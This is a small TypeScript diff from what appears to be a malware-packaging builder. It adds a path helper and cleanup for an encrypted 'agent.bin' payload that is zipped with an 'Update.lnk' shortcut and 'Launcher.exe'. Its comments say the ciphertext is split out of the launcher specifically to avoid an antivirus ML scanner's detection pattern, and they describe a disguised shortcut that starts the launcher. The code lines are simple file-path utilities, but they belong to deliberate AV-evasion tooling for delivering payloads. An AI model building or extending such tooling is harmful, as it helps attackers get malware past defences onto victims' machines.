@@ -70,6 +70,17 @@ export function launcherOutputPath(jobId: string): string {
 }
 
 /**
+ * agentBinOutputPath(jobId): Where the launcher-mode encrypted payload agent.bin
+ * is written before zipping { Update.lnk, Launcher.exe, agent.bin }. This is
+ * Option A (AV): the AES-CTR payload ciphertext lives in this sibling file, NOT
+ * appended to Launcher.exe (which keeps it small and out of the .ml scanner's
+ * "packed exe + giant blob" pattern).
+ */
+export function agentBinOutputPath(jobId: string): string {
+  return path.join(getJobsDir(), jobId, "agent.bin");
+}
+
+/**
  * lnkRelativeOutputPath(jobId): Where the launcher-mode (WP4) Update.lnk is
  * written. "Relative" distinguishes it from the legacy Agent.lnk path — this
  * .lnk targets a RELATIVE Launcher.exe with zero command-line arguments.
@@ -127,7 +138,11 @@ export function removeLnk(jobId: string): void {
  * expiry (mirrors removeLnk for the WP4 relative-target path).
  */
 export function removeLauncherTemp(jobId: string): void {
-  for (const f of [launcherOutputPath(jobId), lnkRelativeOutputPath(jobId)]) {
+  for (const f of [
+    launcherOutputPath(jobId),
+    lnkRelativeOutputPath(jobId),
+    agentBinOutputPath(jobId),
+  ]) {
     if (fs.existsSync(f)) {
       fs.rmSync(f, { force: true });
     }
